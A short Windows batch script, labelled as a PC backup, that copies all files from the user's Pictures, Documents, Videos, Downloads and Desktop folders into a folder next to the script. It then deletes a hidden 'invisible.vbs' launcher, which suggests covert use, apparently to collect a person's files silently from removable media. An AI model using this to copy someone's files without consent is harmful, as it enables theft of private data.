@echo off
color 02

SET "DESTINATION=Backup_PC\%USERNAME%"

IF NOT EXIST "%DESTINATION%" (
    MD "%DESTINATION%"
)

for /R "%USERPROFILE%\Pictures" %%x in (*) do (
    call :CopyFile "%%x" "%DESTINATION%\Pictures\"
)

for /R "%USERPROFILE%\Documents" %%x in (*) do (
    call :CopyFile "%%x" "%DESTINATION%\Documents\"
)

for /R "%USERPROFILE%\Videos" %%x in (*) do (
    call :CopyFile "%%x" "%DESTINATION%\Videos\"
)

for /R "%USERPROFILE%\Downloads" %%x in (*) do (
    call :CopyFile "%%x" "%DESTINATION%\Downloads\"
)

for /R "%USERPROFILE%\Desktop" %%x in (*) do (
    call :CopyFile "%%x" "%DESTINATION%\Desktop\"
)

:: Eliminar el archivo invisible.vbs
del "%temp%\invisible.vbs"

EXIT

:CopyFile
SET "SOURCE_FILE=%~1"
SET "DEST_FOLDER=%~2"
MD "%DEST_FOLDER%" 2>nul
xcopy /H "%SOURCE_FILE%" "%DEST_FOLDER%"
GOTO :EOF
